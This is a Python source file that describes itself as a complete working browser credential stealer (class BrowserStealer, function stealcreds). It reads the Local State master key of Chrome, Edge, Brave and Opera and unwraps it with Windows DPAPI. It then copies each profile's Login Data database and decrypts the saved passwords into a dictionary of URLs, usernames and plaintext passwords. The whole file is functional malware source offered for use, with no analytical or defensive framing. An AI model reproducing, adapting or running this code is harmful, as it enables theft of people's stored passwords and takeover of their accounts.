# browser.py - COMPLETE WORKING VERSION
import os
import json
import base64
import sqlite3
import shutil
import random
import win32crypt

# Flexible crypto import
try:
    from Crypto.Cipher import AES
    print("✅ Using Crypto.Cipher")
except ImportError:
    try:
        from Cryptodome.Cipher import AES
        print("✅ Using Cryptodome.Cipher") 
    except ImportError:
        print("❌ No crypto module found")
        AES = None

class BrowserStealer:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data', 
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
        }
        self.profiles = ['Default', 'Profile 1']

    def get_master_key(self, path: str):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Key error: {e}")
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        if AES is None:
            return "[Crypto module missing]"
            
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except Exception as e:
            return f"[Decrypt failed]"

    def extract_passwords(self, name: str, path: str, profile: str):
        credentials = {}
        try:
            if name == 'opera':
                login_db_path = path + '\\Login Data'
                master_key_path = path + '\\Local State'
            else:
                login_db_path = path + '\\' + profile + '\\Login Data'
                master_key_path = path + '\\Local State'

            if not os.path.isfile(login_db_path):
                return credentials

            master_key = self.get_master_key(master_key_path)
            if not master_key:
                return credentials

            temp_db = f"temp_{random.randint(1000, 9999)}.db"
            shutil.copy2(login_db_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for url, username, encrypted_password in cursor.fetchall():
                if url and (username or encrypted_password):
                    password = self.decrypt_password(encrypted_password, master_key)
                    if url not in credentials:
                        credentials[url] = []
                    credentials[url].append({
                        "username": username or "[No username]",
                        "password": password,
                        "browser": name,
                        "profile": profile
                    })

            cursor.close()
            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"Error: {e}")

        return credentials

def stealcreds():
    if AES is None:
        return {"error": "Crypto module not available - install pycryptodome"}
        
    try:
        stealer = BrowserStealer()
        all_credentials = {}
        found_browsers = []

        print("🔍 Scanning browsers...")
        
        for browser_name, browser_path in stealer.browsers.items():
            if not os.path.exists(browser_path):
                print(f"❌ {browser_name} not found")
                continue
                
            print(f"✅ Found {browser_name}")
            found_browsers.append(browser_name)
            
            for profile in stealer.profiles:
                credentials = stealer.extract_passwords(browser_name, browser_path, profile)
                all_credentials.update(credentials)

        if all_credentials:
            return all_credentials
        elif found_browsers:
            return {
                "message": f"Found browsers but no passwords: {', '.join(found_browsers)}",
                "browsers": found_browsers
            }
        else:
            return {"error": "No browsers found"}

    except Exception as e:
        return {"error": f"Failed: {str(e)}"}

if __name__ == "__main__":
    result = stealcreds()
    print("Test:", result)